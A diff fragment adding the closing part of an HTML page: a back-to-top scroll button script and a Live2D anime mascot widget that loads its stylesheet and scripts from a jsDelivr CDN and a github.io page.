+        rightSideBar.appendChild(btn)
+        
+        window.onscroll = function() {
+            
+            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+                btn.style.display = "block";
+            } else {
+                btn.style.display = "none";
+            }
+        };
+    }
+
+    
+
+    function backToTop(){
+        window.scrollTo({ top: 0, behavior: "smooth" })
+    }
+
+    initScrollTop();
+</script>
+
+
+<script>   
+  const cdnPath = "https://cdn.jsdelivr.net/gh/0d000721999/live2d-test@main";
+  const cssPath = "https://0d000721999.github.io/waifu/waifu.css"
+  const config = {
+    
+    path: {
+      homePath: "/",
+      modelPath: cdnPath + "/Resources/",
+      cssPath: cssPath,
+      tipsJsonPath: cdnPath + "/waifu-tips.json",
+      tipsJsPath: cdnPath + "/waifu-tips.js",
+      live2dCorePath: cdnPath + "/Core/live2dcubismcore.js",
+      live2dSdkPath: cdnPath + "/live2d-sdk.js"
+    },
+    
+    tools: ["hitokoto", "asteroids", "express","photo", "quit"],
+    
+    drag: {
+      enable: true,
+      direction: ["x", "y"]
+    },
+    
+    switchType: "order"
+  }
+
+  
+  if (screen.width >= 768) {
+    Promise.all([
+      loadExternalResource(config.path.cssPath, "css"),
+      loadExternalResource(config.path.live2dCorePath, "js"),
+      loadExternalResource(config.path.live2dSdkPath, "js"),
+      loadExternalResource(config.path.tipsJsPath, "js")
+    ]).then(() => {
+      initWidget({
+        waifuPath: config.path.tipsJsonPath,
+        cdnPath: config.path.modelPath,
+        tools: config.tools,
+        dragEnable: config.drag.enable,
+        dragDirection: config.drag.direction,
+        switchType: config.switchType
+      });
+    });
+  }
+
+  
+  function loadExternalResource(url, type) {
+    return new Promise((resolve, reject) => {
+      let tag;
+      if (type === "css") {
+        tag = document.createElement("link");
+        tag.rel = "stylesheet";
+        tag.href = url;
+      }
+      else if (type === "js") {
+        tag = document.createElement("script");
+        tag.src = url;
+      }
+      if (tag) {
+        tag.onload = () => resolve(url);
+        tag.onerror = () => reject(url);
+        document.head.appendChild(tag);
+      }
+    });
+  }
+</script>
+
+    </body>
+</html>
